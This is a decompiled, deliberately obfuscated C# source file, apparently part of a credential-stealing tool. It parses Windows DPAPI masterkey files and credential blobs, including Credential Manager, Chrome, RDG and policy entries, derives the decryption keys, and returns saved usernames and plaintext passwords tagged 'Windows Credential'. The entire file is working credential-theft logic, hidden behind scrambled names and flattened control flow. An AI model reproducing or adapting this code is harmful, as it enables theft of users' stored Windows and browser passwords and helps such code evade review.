using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using C6Zy;
using PK42;

namespace reJu9lk2r
{
	// Token: 0x02000062 RID: 98
	public static class Ro9zpAaKm
	{
		// Token: 0x060001CA RID: 458 RVA: 0x000275F0 File Offset: 0x000257F0
		public static WTitxI2m kgd3oS(byte[] MwTYVS, IEF.f4t8Y cSs = IEF.f4t8Y.G9JoZ7AMUom)
		{
			int num = 0;
			int num2;
			for (;;)
			{
				if (num == 4)
				{
					BitConverter.ToUInt32(MwTYVS, num2);
					num = 5;
				}
				if (num == 5)
				{
					num2 += 4;
					num = 6;
				}
				if (num == 2)
				{
					BitConverter.ToUInt32(MwTYVS, num2);
					num = 3;
				}
				uint num3;
				if (num == 8)
				{
					num3 = BitConverter.ToUInt32(MwTYVS, num2);
					num = 9;
				}
				if (num == 10)
				{
					break;
				}
				if (num == 6)
				{
					BitConverter.ToUInt32(MwTYVS, num2);
					num = 7;
				}
				if (num == 1)
				{
					num2 = 0;
					num = 2;
				}
				if (num == 3)
				{
					num2 += 4;
					num = 4;
				}
				if (num == 9)
				{
					if (num3 == (uint)cSs)
					{
						goto IL_1C5;
					}
					num = 10;
				}
				if (num == 7)
				{
					num2 += 4;
					num = 8;
				}
				if (num == 0)
				{
					num = 1;
				}
				if (num == 11)
				{
					goto Block_13;
				}
			}
			return null;
			Block_13:
			IL_1C5:
			num2 += 4;
			BitConverter.ToUInt32(MwTYVS, num2);
			num2 += 4;
			num2 += 8;
			BitConverter.ToUInt32(MwTYVS, num2);
			num2 += 4;
			BitConverter.ToUInt32(MwTYVS, num2);
			num2 += 4;
			BitConverter.ToUInt32(MwTYVS, num2);
			num2 += 4;
			BitConverter.ToUInt32(MwTYVS, num2);
			num2 += 4;
			BitConverter.ToUInt32(MwTYVS, num2);
			num2 += 4;
			int num4 = BitConverter.ToInt32(MwTYVS, num2);
			num2 += 4;
			string @string = Encoding.Unicode.GetString(MwTYVS, num2, num4);
			num2 += num4;
			int num5 = BitConverter.ToInt32(MwTYVS, num2);
			num2 += 4;
			Encoding.Unicode.GetString(MwTYVS, num2, num5);
			num2 += num5;
			int num6 = BitConverter.ToInt32(MwTYVS, num2);
			num2 += 4;
			Encoding.Unicode.GetString(MwTYVS, num2, num6);
			num2 += num6;
			int num7 = BitConverter.ToInt32(MwTYVS, num2);
			num2 += 4;
			Encoding.Unicode.GetString(MwTYVS, num2, num7);
			num2 += num7;
			int num8 = BitConverter.ToInt32(MwTYVS, num2);
			num2 += 4;
			string string2 = Encoding.Unicode.GetString(MwTYVS, num2, num8);
			num2 += num8;
			int num9 = BitConverter.ToInt32(MwTYVS, num2);
			num2 += 4;
			byte[] array = new byte[num9 - 1 + 1];
			Array.Copy(MwTYVS, num2, array, 0, num9);
			num2 += num9;
			string password;
			if (Ro9zpAaKm.4CA154a(array))
			{
				string string3 = Encoding.Unicode.GetString(array);
				password = string3;
			}
			else
			{
				string text = BitConverter.ToString(array).Replace("-", "");
				password = text;
			}
			return new WTitxI2m
			{
				data2 = string2,
				data3 = password,
				data1 = @string,
				data4 = "Windows Credential"
			};
		}

		// Token: 0x060001CB RID: 459 RVA: 0x00027AE4 File Offset: 0x00025CE4
		public static byte[] IVT7E6h3(byte[] p8K, Dictionary<string, string> 4u6aO7, string X7qHOf8Gq = "credential", bool QvpDkLDnbg = false)
		{
			int num = 0;
			int num2;
			for (;;)
			{
				if (num == 3)
				{
					num2 = 36;
					num = 4;
				}
				if (num == 4)
				{
					break;
				}
				if (num == 5)
				{
					goto IL_61;
				}
				goto IL_82;
				IL_18C:
				if (num == 1)
				{
					num2 = 0;
					num = 2;
				}
				if (num == 11)
				{
					goto IL_1C0;
				}
				if (num == 12)
				{
					break;
				}
				if (num == 0)
				{
					num = 1;
				}
				if (num == 13)
				{
					byte[] result;
					return result;
				}
				continue;
				IL_82:
				if (num == 7)
				{
					if (X7qHOf8Gq.Equals("rdg"))
					{
						goto IL_17A;
					}
					num = 8;
				}
				if (num == 6)
				{
					if (X7qHOf8Gq.Equals("blob"))
					{
						goto IL_17A;
					}
					num = 7;
				}
				if (num == 10)
				{
					break;
				}
				if (num == 8)
				{
					if (!X7qHOf8Gq.Equals("chrome"))
					{
						goto IL_1C0;
					}
					num = 9;
				}
				if (num == 2)
				{
					if (!X7qHOf8Gq.Equals("credential"))
					{
						goto IL_61;
					}
					num = 3;
				}
				if (num != 9)
				{
					goto IL_18C;
				}
				IL_17A:
				num2 = 24;
				num = 10;
				goto IL_18C;
				IL_61:
				if (!X7qHOf8Gq.Equals("policy"))
				{
					num = 6;
					goto IL_82;
				}
				goto IL_17A;
			}
			goto IL_1E5;
			IL_1C0:
			return new byte[0];
			IL_1E5:
			byte[] array = new byte[16];
			Array.Copy(p8K, num2, array, 0, 16);
			Guid guid = new Guid(array);
			string key = string.Format("{{{0}}}", guid);
			num2 += 16;
			BitConverter.ToUInt32(p8K, num2);
			num2 += 4;
			int num3 = BitConverter.ToInt32(p8K, num2);
			num2 += 4;
			Encoding.Unicode.GetString(p8K, num2, num3);
			num2 += num3;
			int arahjJA = BitConverter.ToInt32(p8K, num2);
			num2 += 4;
			int num4 = BitConverter.ToInt32(p8K, num2);
			num2 += 4;
			int num5 = BitConverter.ToInt32(p8K, num2);
			num2 += 4;
			byte[] array2 = new byte[num5 - 1 + 1];
			Array.Copy(p8K, num2, array2, 0, num5);
			num2 += num5;
			int num6 = BitConverter.ToInt32(p8K, num2);
			num2 += 4 + num6;
			int num7 = BitConverter.ToInt32(p8K, num2);
			num2 += 4;
			BitConverter.ToInt32(p8K, num2);
			num2 += 4;
			int num8 = BitConverter.ToInt32(p8K, num2);
			num2 += 4 + num8;
			int num9 = BitConverter.ToInt32(p8K, num2);
			num2 += 4;
			byte[] array3 = new byte[num9 - 1 + 1];
			Array.Copy(p8K, num2, array3, 0, num9);
			if (4u6aO7.ContainsKey(key))
			{
				if (num7 == 32782)
				{
					try
					{
						byte[] kVnNUCL = Ro9zpAaKm.F9e52(4u6aO7[key].ToString());
						byte[] sourceArray = Ro9zpAaKm.uQqNm4(kVnNUCL, array2, num7);
						byte[] array4 = new byte[num4 / 8];
						Array.Copy(sourceArray, array4, Convert.ToInt32((double)num4 / 8.0));
						if (X7qHOf8Gq.Equals("chrome"))
						{
							return Ro9zpAaKm.bUmrA3mkef(array3, array4, arahjJA, PaddingMode.PKCS7);
						}
						return Ro9zpAaKm.bUmrA3mkef(array3, array4, arahjJA, PaddingMode.Zeros);
					}
					catch
					{
						goto IL_588;
					}
				}
				if (num7 == 32772)
				{
					try
					{
						byte[] kVnNUCL2 = Ro9zpAaKm.F9e52(4u6aO7[key].ToString());
						byte[] sourceArray2 = Ro9zpAaKm.uQqNm4(kVnNUCL2, array2, num7);
						byte[] array5 = new byte[num4 / 8];
						Array.Copy(sourceArray2, array5, Convert.ToInt32(num4 / 8));
						return Ro9zpAaKm.bUmrA3mkef(array3, array5, arahjJA, PaddingMode.Zeros);
					}
					catch
					{
					}
				}
			}
			IL_588:
			return new byte[0];
		}

		// Token: 0x060001CC RID: 460 RVA: 0x000280E4 File Offset: 0x000262E4
		public static byte[] uQqNm4(byte[] kVnNUCL, byte[] oLsj, int bNPYNfVUj2x = 32772)
		{
			int num = 0;
			byte[] result;
			for (;;)
			{
				if (num == 3)
				{
					HMACSHA512 hmacsha;
					result = hmacsha.ComputeHash(oLsj);
					num = 4;
				}
				if (num == 2)
				{
					HMACSHA512 hmacsha = new HMACSHA512(kVnNUCL);
					num = 3;
				}
				if (num == 4)
				{
					break;
				}
				if (num == 1)
				{
					if (bNPYNfVUj2x != 32782)
					{
						goto IL_B8;
					}
					num = 2;
				}
				if (num == 5)
				{
					goto IL_B8;
				}
				if (num == 0)
				{
					num = 1;
				}
				if (num == 6)
				{
					byte[] result2;
					return result2;
				}
			}
			return result;
			IL_B8:
			if (bNPYNfVUj2x == 32772)
			{
				HMACSHA1 hmacsha2 = new HMACSHA1(kVnNUCL);
				byte[] array = new byte[64];
				byte[] array2 = new byte[64];
				byte[] array3 = hmacsha2.ComputeHash(oLsj);
				for (int i = 0; i <= 63; i++)
				{
					array[i] = Convert.ToByte('6');
					array2[i] = Convert.ToByte('\\');
				}
				for (int j = 0; j <= kVnNUCL.Length - 1; j++)
				{
					array[j] ^= array3[j];
					array2[j] ^= array3[j];
				}
				using (SHA1Managed sha1Managed = new SHA1Managed())
				{
					byte[] j8JaCx = sha1Managed.ComputeHash(array);
					byte[] p6K7KbBD = sha1Managed.ComputeHash(array2);
					return Ro9zpAaKm.8e8Sew4(j8JaCx, p6K7KbBD);
				}
			}
			return new byte[0];
		}

		// Token: 0x060001CD RID: 461 RVA: 0x00028368 File Offset: 0x00026568
		public static byte[] bUmrA3mkef(byte[] JDan1, byte[] g151h4, int ARAHjJA = 26115, PaddingMode 0Z3sjdo = PaddingMode.Zeros)
		{
			int num = 0;
			while (num != 10)
			{
				TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider;
				if (num == 4)
				{
					tripleDESCryptoServiceProvider.Key = g151h4;
					num = 5;
				}
				if (num != 9)
				{
					if (num == 8)
					{
						try
						{
							return tripleDESCryptoServiceProvider.CreateDecryptor().TransformFinalBlock(JDan1, 0, JDan1.Length);
						}
						catch
						{
						}
						return new byte[0];
					}
					if (num == 7)
					{
						tripleDESCryptoServiceProvider.Padding = 0Z3sjdo;
						num = 8;
					}
					if (num == 2)
					{
						tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
						num = 3;
					}
					if (num == 5)
					{
						byte[] iv;
						tripleDESCryptoServiceProvider.IV = iv;
						num = 6;
					}
					if (num == 3)
					{
						byte[] iv = new byte[8];
						num = 4;
					}
					if (num == 1)
					{
						if (ARAHjJA != 26115)
						{
							goto IL_6B;
						}
						num = 2;
					}
					if (num == 6)
					{
						tripleDESCryptoServiceProvider.Mode = CipherMode.CBC;
						num = 7;
					}
					if (num == 0)
					{
						num = 1;
					}
					if (num != 11)
					{
						continue;
					}
					byte[] result;
					return result;
				}
				IL_6B:
				if (ARAHjJA == 26128)
				{
					RijndaelManaged rijndaelManaged = new RijndaelManaged();
					byte[] iv2 = new byte[16];
					rijndaelManaged.Key = g151h4;
					rijndaelManaged.IV = iv2;
					rijndaelManaged.Mode = CipherMode.CBC;
					rijndaelManaged.Padding = 0Z3sjdo;
					return rijndaelManaged.CreateDecryptor().TransformFinalBlock(JDan1, 0, JDan1.Length);
				}
				break;
			}
			return new byte[0];
		}

		// Token: 0x060001CE RID: 462 RVA: 0x000285F8 File Offset: 0x000267F8
		public static byte[] F9e52(string Vw1)
		{
			int num = 0;
			byte[] array;
			for (;;)
			{
				int num2;
				if (num == 2)
				{
					num2 = 0;
					num = 3;
				}
				if (num == 5)
				{
					num2 += 2;
					num = 6;
				}
				if (num == 1)
				{
					array = new byte[Vw1.Length / 2];
					num = 2;
				}
				if (num == 3)
				{
					goto IL_BB;
				}
				if (num == 6)
				{
					goto IL_BB;
				}
				goto IL_DC;
				IL_121:
				if (num == 0)
				{
					num = 1;
				}
				if (num == 7)
				{
					break;
				}
				continue;
				IL_DC:
				if (num != 4)
				{
					goto IL_121;
				}
				IL_ED:
				array[num2 / 2] = Convert.ToByte(Vw1.Substring(num2, 2), 16);
				num = 5;
				goto IL_121;
				IL_BB:
				if (num2 > Vw1.Length - 1)
				{
					num = 7;
					goto IL_DC;
				}
				goto IL_ED;
			}
			return array;
		}

		// Token: 0x060001CF RID: 463 RVA: 0x00028760 File Offset: 0x00026960
		public static bool 4CA154a(byte[] rt2)
		{
			int num = 0;
			IEF.7nl 7nl;
			do
			{
				if (num == 1)
				{
					7nl = IEF.7nl.vK5;
					num = 2;
				}
				if (num == 0)
				{
					num = 1;
				}
			}
			while (num != 2);
			return IEF.IsTextUnicode(rt2, rt2.Length, ref 7nl);
		}

		// Token: 0x060001D0 RID: 464 RVA: 0x000287E8 File Offset: 0x000269E8
		public static byte[] AUe0Tnh(string S62j02C8o36, string PGP7)
		{
			int num = 0;
			byte[] array;
			byte[] bytes2;
			SHA1Managed sha1Managed;
			do
			{
				string s;
				if (num == 1)
				{
					s = Path.GetFileName(PGP7).TrimEnd(new char[]
					{
						Path.DirectorySeparatorChar
					});
					num = 2;
				}
				byte[] bytes;
				if (num == 5)
				{
					bytes.CopyTo(array, 0);
					num = 6;
				}
				if (num == 2)
				{
					bytes2 = Encoding.Unicode.GetBytes(S62j02C8o36);
					num = 3;
				}
				if (num == 7)
				{
					sha1Managed = new SHA1Managed();
					num = 8;
				}
				if (num == 6)
				{
					array[array.Length - 2] = 0;
					num = 7;
				}
				if (num == 3)
				{
					bytes = Encoding.Unicode.GetBytes(s);
					num = 4;
				}
				if (num == 4)
				{
					array = new byte[bytes.Length + 2 - 1 + 1];
					num = 5;
				}
				if (num == 0)
				{
					num = 1;
				}
			}
			while (num != 8);
			byte[] array2;
			try
			{
				array2 = sha1Managed.ComputeHash(bytes2);
			}
			finally
			{
				if (sha1Managed != null)
				{
					((IDisposable)sha1Managed).Dispose();
				}
			}
			Ro9zpAaKm.8e8Sew4(array2, array);
			byte[] result;
			using (HMACSHA1 hmacsha = new HMACSHA1(array2))
			{
				result = hmacsha.ComputeHash(array);
			}
			return result;
		}

		// Token: 0x060001D1 RID: 465 RVA: 0x00028A28 File Offset: 0x00026C28
		public static byte[] 8e8Sew4(byte[] j8JaCx, byte[] P6K7KbBD1)
		{
			int num = 0;
			byte[] array;
			do
			{
				if (num == 3)
				{
					Buffer.BlockCopy(P6K7KbBD1, 0, array, j8JaCx.Length, P6K7KbBD1.Length);
					num = 4;
				}
				if (num == 1)
				{
					array = new byte[j8JaCx.Length + P6K7KbBD1.Length - 1 + 1];
					num = 2;
				}
				if (num == 2)
				{
					Buffer.BlockCopy(j8JaCx, 0, array, 0, j8JaCx.Length);
					num = 3;
				}
				if (num == 0)
				{
					num = 1;
				}
			}
			while (num != 4);
			return array;
		}

		// Token: 0x060001D2 RID: 466 RVA: 0x00028B28 File Offset: 0x00026D28
		public static Dictionary<string, string> axwpQ4(byte[] hYU, byte[] imyK)
		{
			int num = 0;
			Dictionary<string, string> dictionary;
			while (num != 2)
			{
				if (num == 1)
				{
					dictionary = new Dictionary<string, string>();
					num = 2;
				}
				if (num == 0)
				{
					num = 1;
				}
				if (num == 3)
				{
					Dictionary<string, string> result;
					return result;
				}
			}
			try
			{
				string key = string.Format("{{{0}}}", Encoding.Unicode.GetString(hYU, 12, 72));
				byte[] array = Ro9zpAaKm.JQ42hmFO7S5(hYU);
				int num2 = 4;
				byte[] array2 = new byte[16];
				Array.Copy(array, 4, array2, 0, 16);
				num2 += 16;
				int iterations = BitConverter.ToInt32(array, num2);
				num2 += 4;
				int num3 = BitConverter.ToInt32(array, num2);
				num2 += 4;
				int num4 = BitConverter.ToInt32(array, num2);
				num2 += 4;
				byte[] array3 = new byte[array.Length - num2 - 1 + 1];
				Array.Copy(array, num2, array3, 0, array3.Length);
				byte[] sourceArray = new byte[48];
				if (num3 == 32782)
				{
					using (HMACSHA512 hmacsha = new HMACSHA512())
					{
						sourceArray = new 93WgTZS3(hmacsha, imyK, array2, iterations).rHd9AQN83Om(48, "sha512");
						goto IL_204;
					}
				}
				if (num3 == 32777)
				{
					using (HMACSHA1 hmacsha2 = new HMACSHA1())
					{
						sourceArray = new 93WgTZS3(hmacsha2, imyK, array2, iterations).rHd9AQN83Om(32, "sha512");
						goto IL_204;
					}
				}
				return dictionary;
				IL_204:
				if (num4 == 26128 && num3 == 32782)
				{
					int num5 = new HMACSHA512().HashSize / 8;
					RijndaelManaged rijndaelManaged = new RijndaelManaged();
					byte[] array4 = new byte[16];
					Array.Copy(sourceArray, 32, array4, 0, 16);
					byte[] array5 = new byte[32];
					Array.Copy(sourceArray, 0, array5, 0, 32);
					rijndaelManaged.Key = array5;
					rijndaelManaged.IV = array4;
					rijndaelManaged.Mode = CipherMode.CBC;
					rijndaelManaged.Padding = PaddingMode.Zeros;
					byte[] array6 = rijndaelManaged.CreateDecryptor().TransformFinalBlock(array3, 0, array3.Length);
					int num6 = array6.Length;
					int num7 = num6 - 16 - num5;
					byte[] array7 = new byte[num5 - 1 + 1];
					Array.Copy(array6, num6 - num7, array7, 0, array7.Length);
					using (SHA1Managed sha1Managed = new SHA1Managed())
					{
						byte[] value = sha1Managed.ComputeHash(array7);
						string value2 = BitConverter.ToString(value).Replace("-", "");
						if (num3 != 32782)
						{
							return dictionary;
						}
						byte[] array8 = new byte[16];
						Array.Copy(array6, array8, 16);
						HMACSHA512 hmacsha3 = new HMACSHA512(imyK);
						byte[] key2 = hmacsha3.ComputeHash(array8);
						byte[] array9 = new byte[num7 - 1 + 1];
						Array.Copy(array6, num6 - num7, array9, 0, num7);
						HMACSHA512 hmacsha4 = new HMACSHA512(key2);
						byte[] value3 = hmacsha4.ComputeHash(array9);
						byte[] array10 = new byte[64];
						Array.Copy(array6, 16, array10, 0, array10.Length);
						string text = BitConverter.ToString(array10).Replace("-", "");
						string value4 = BitConverter.ToString(value3).Replace("-", "");
						if (text.Equals(value4))
						{
							dictionary.Add(key, value2);
							goto IL_66F;
						}
						return dictionary;
					}
					goto IL_4F2;
					IL_66F:
					return dictionary;
				}
				IL_4F2:
				if (num4 == 26115 && num3 == 32777)
				{
					TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
					byte[] array11 = new byte[8];
					byte[] array12 = new byte[24];
					Array.Copy(sourceArray, 24, array11, 0, 8);
					Array.Copy(sourceArray, 0, array12, 0, 24);
					tripleDESCryptoServiceProvider.Key = array12;
					tripleDESCryptoServiceProvider.IV = array11;
					tripleDESCryptoServiceProvider.Mode = CipherMode.CBC;
					tripleDESCryptoServiceProvider.Padding = PaddingMode.Zeros;
					byte[] sourceArray2 = tripleDESCryptoServiceProvider.CreateDecryptor().TransformFinalBlock(array3, 0, array3.Length);
					byte[] array13 = new byte[64];
					Array.Copy(sourceArray2, 40, array13, 0, 64);
					using (SHA1Managed sha1Managed2 = new SHA1Managed())
					{
						byte[] value5 = sha1Managed2.ComputeHash(array13);
						string value6 = BitConverter.ToString(value5).Replace("-", "");
						dictionary.Add(key, value6);
					}
					return dictionary;
				}
				return dictionary;
			}
			catch
			{
			}
			return dictionary;
		}

		// Token: 0x060001D3 RID: 467 RVA: 0x000292A0 File Offset: 0x000274A0
		public static byte[] JQ42hmFO7S5(byte[] xB6bH)
		{
			int num = 0;
			byte[] array;
			do
			{
				int num2;
				if (num == 1)
				{
					num2 = 96;
					num = 2;
				}
				long num3;
				if (num == 4)
				{
					array = new byte[num3 - 1L + 1L];
					num = 5;
				}
				if (num == 5)
				{
					Array.Copy(xB6bH, (long)num2, array, 0L, num3);
					num = 6;
				}
				if (num == 3)
				{
					num2 += 32;
					num = 4;
				}
				if (num == 2)
				{
					num3 = BitConverter.ToInt64(xB6bH, num2);
					num = 3;
				}
				if (num == 0)
				{
					num = 1;
				}
			}
			while (num != 6);
			return array;
		}

		// Token: 0x060001D4 RID: 468 RVA: 0x000293D8 File Offset: 0x000275D8
		public static Ro9zpAaKm.AWtWeQXkJ5g E8HuSEE3oc(string rTWxNRv)
		{
			int num = 0;
			Ro9zpAaKm.AWtWeQXkJ5g result;
			do
			{
				byte[] array;
				string @string;
				if (num == 11)
				{
					@string = Encoding.Unicode.GetString(array);
					num = 12;
				}
				if (num == 9)
				{
					int num2;
					array = new byte[num2 - 4 - 1 + 1];
					num = 10;
				}
				byte[] sourceArray;
				if (num == 2)
				{
					sourceArray = File.ReadAllBytes(rTWxNRv);
					num = 3;
				}
				byte[] array2;
				if (num == 8)
				{
					int num2 = BitConverter.ToInt32(array2, 0);
					num = 9;
				}
				if (num == 7)
				{
					Array.Copy(sourceArray, 56, array2, 0, 4);
					num = 8;
				}
				long length;
				if (num == 1)
				{
					length = new FileInfo(rTWxNRv).Length;
					num = 2;
				}
				byte[] array3;
				if (num == 3)
				{
					array3 = new byte[16];
					num = 4;
				}
				if (num == 12)
				{
					Guid guidMasterKey;
					result = new Ro9zpAaKm.AWtWeQXkJ5g(Path.GetFileName(rTWxNRv), @string, guidMasterKey, File.GetLastAccessTime(rTWxNRv), File.GetLastAccessTime(rTWxNRv), length);
					num = 13;
				}
				if (num == 5)
				{
					Guid guidMasterKey = new Guid(array3);
					num = 6;
				}
				if (num == 6)
				{
					array2 = new byte[16];
					num = 7;
				}
				if (num == 10)
				{
					Array.Copy(sourceArray, 60, array, 0, array.Length);
					num = 11;
				}
				if (num == 4)
				{
					Array.Copy(sourceArray, 36, array3, 0, 16);
					num = 5;
				}
				if (num == 0)
				{
					num = 1;
				}
			}
			while (num != 13);
			return result;
		}

		// Token: 0x02000063 RID: 99
		public class AWtWeQXkJ5g
		{
			// Token: 0x060001D5 RID: 469 RVA: 0x0000782C File Offset: 0x00005A2C
			public AWtWeQXkJ5g(string _fileName, string _description, Guid _guidMasterKey, DateTime _lastAccessed, DateTime _lastModified, long size)
			{
				this.7tJ4 = _fileName;
				this.ClBBVk = _description;
				this.sGO80W = _guidMasterKey;
				this.i0c5 = _lastAccessed;
				this.A0lhEbS9ZIH = _lastModified;
				this.BFNNS3dO = size;
			}

			// Token: 0x1700004A RID: 74
			// (get) Token: 0x060001D6 RID: 470 RVA: 0x00007861 File Offset: 0x00005A61
			// (set) Token: 0x060001D7 RID: 471 RVA: 0x00007869 File Offset: 0x00005A69
			public string 7tJ4 { get; set; }

			// Token: 0x1700004B RID: 75
			// (get) Token: 0x060001D8 RID: 472 RVA: 0x00007872 File Offset: 0x00005A72
			// (set) Token: 0x060001D9 RID: 473 RVA: 0x0000787A File Offset: 0x00005A7A
			public string ClBBVk { get; set; }

			// Token: 0x1700004C RID: 76
			// (get) Token: 0x060001DA RID: 474 RVA: 0x00007883 File Offset: 0x00005A83
			// (set) Token: 0x060001DB RID: 475 RVA: 0x0000788B File Offset: 0x00005A8B
			public Guid sGO80W { get; set; }

			// Token: 0x1700004D RID: 77
			// (get) Token: 0x060001DC RID: 476 RVA: 0x00007894 File Offset: 0x00005A94
			// (set) Token: 0x060001DD RID: 477 RVA: 0x0000789C File Offset: 0x00005A9C
			public DateTime i0c5 { get; set; }

			// Token: 0x1700004E RID: 78
			// (get) Token: 0x060001DE RID: 478 RVA: 0x000078A5 File Offset: 0x00005AA5
			// (set) Token: 0x060001DF RID: 479 RVA: 0x000078AD File Offset: 0x00005AAD
			public DateTime A0lhEbS9ZIH { get; set; }

			// Token: 0x1700004F RID: 79
			// (get) Token: 0x060001E0 RID: 480 RVA: 0x000078B6 File Offset: 0x00005AB6
			// (set) Token: 0x060001E1 RID: 481 RVA: 0x000078BE File Offset: 0x00005ABE
			public long BFNNS3dO { get; set; }
		}
	}
}
